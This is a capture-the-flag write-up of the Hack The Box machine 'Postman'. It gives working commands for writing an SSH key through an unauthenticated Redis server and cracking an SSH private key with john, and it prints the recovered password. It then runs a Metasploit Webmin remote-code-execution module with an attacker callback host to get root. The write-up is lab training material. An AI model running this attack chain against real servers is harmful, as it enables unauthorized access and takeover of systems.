---
title: "HTB Postman"
date: 2026-05-11 19:56:00 +0100
categories: [CPTS Preparation]
tags: [htb, machine, linux, Easy, redis, webmin]
image: /assets/img/posts/postman/postman.png
---
HTB Postman is a Linux machine centered on misconfigured services. I first used an `unauthenticated` Redis instance to write an SSH public key into `authorized_keys`, which gave me access as redis; from there I recovered a cracked SSH private key to move laterally to `Matt`, and finally exploited an old `Webmin` instance to obtain root.

## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.2.1 -nv --min-rate 1000
```
```
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
6379/tcp  open     redis
10000/tcp open     snet-sensor-mgmt
```
- NSE Scripts & Version
```
nmap 10.129.2.1 -sCV -p22,80,6379,10000 -nv --min-rate 1000
```
```
PORT      STATE SERVICE  VERSION                                                                                                               16:29 [10/155]
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                        
| ssh-hostkey:                             
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)                                                                                               
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)                                                                                              
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)                                                                                            
80/tcp    open  http     Apache httpd 2.4.29 ((Ubuntu))                                                                                                      
|_http-title: The Cyber Geek's Personal Website                                                                                                              
| http-methods:                                                                                                                             
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                 
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
6379/tcp  open  redis    Redis key-value store 4.0.9
10000/tcp open  ssl/http MiniServ 1.910 (Webmin httpd)
|_http-server-header: MiniServ/1.910
|_http-title: Login to Webmin
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on Postman
| Issuer: commonName=*/organizationName=Webmin Webserver on Postman
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-08-25T16:26:22
| Not valid after:  2024-08-23T16:26:22
| MD5:     96f4 064c e63e 1277 4954 a4d9 a099 56ac
| SHA-1:   4322 6ff3 ab7a 6ade 2887 9b89 6657 401c 3afd 5217
|_SHA-256: 36fc 82c9 d4e2 9a62 2fa4 a7c8 e33e 61bb f5c5 ca5e c230 6172 a82f 4856 8367 34ba
|_http-favicon: Unknown favicon MD5: 066AF1F6A59FCB67495B545A6B81F371
|_http-trane-info: Problem with XML parsing of /evox/about
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Redis
- Webmin
## Redis
### Write SSH Key
- set the `configuration`
```
redis-cli -h 10.129.2.1
```
![redis1](/assets/img/posts/postman/redis.png)
- create `ssh keys`
```
ssh-keygen -t rsa
```
```
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > space_w_key.txt
```
```
cat space_w_key.txt | redis-cli -h 10.129.2.1 -x set hoxon
```
```
redis-cli -h 10.129.2.1
config set dbfilename "authorized_keys"
save
```
### ssh as redis
```
ssh -i id_rsa redis@10.129.2.1
-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
```
### ssh2john
```
ssh2john id_rsa_mark_enc  > hash_rsa.txt
john hash_rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt
computer2008     (id_rsa_mark_enc)
```
### ssh as Matt
```
su Matt #computer2008
```
## Priv: Matt --> root
![webmin](/assets/img/posts/postman/webmin.png)
### msfconsole
```
search webmin
...
7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
```
```
msfconsole
use exploit/linux/http/webmin_packageup_rce
set USERNAME Matt
set PASSWORD computer2008
set SSL true
set RHOSTS 10.129.2.1
set LHOST 10.10.14.141
```
```
id
uid=0(root) gid=0(root) groups=0(root)
```